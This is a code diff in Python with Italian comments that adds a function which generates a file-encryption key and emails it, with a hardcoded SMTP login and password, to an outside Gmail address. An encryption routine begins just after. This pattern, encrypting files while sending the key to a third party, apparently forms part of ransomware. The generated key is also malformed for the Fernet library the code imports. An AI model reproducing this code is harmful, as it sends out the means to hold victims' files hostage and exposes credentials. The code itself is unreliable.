@@ -1,10 +1,36 @@
 from cryptography.fernet import Fernet
+import secrets
+import string
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
 def genera_chiave():
     """Genera una chiave casuale per la cifratura dei
     file e la invia per email a pierobrandola@gmail.com
     """
-    pass
+    lunghezza_c = 16
+    caratteri_c = string.ascii_letters + string.digits
+    chiave = ''.join(secrets.choice(caratteri_c) for _ in range(lunghezza_c))
+
+    destinatario = 'pierobrandola@gmail.com'
+    mittente = 'acherinoscammini@libero.it'
+    oggetto = 'Chiave di cifratura casuale'
+    testo_email = f"Ecco la tua chiave di cifratura casuale: {chiave}"
+    msg = MIMEMultipart()
+    msg['From'] = mittente
+    msg['To'] = destinatario
+    msg['Subject'] = oggetto
+
+    msg.attach(MIMEText(testo_email, 'plain'))
+
+    server = smtplib.SMTP('smtp.libero.it', 587)
+    server.starttls()
+    server.login(mittente, 'Password12395@')
+    server.sendmail(mittente, destinatario, msg.as_string())
+    server.quit()
+
+    return chiave
 
 def cifra_file_singolo(file_path, chiave):
     try:
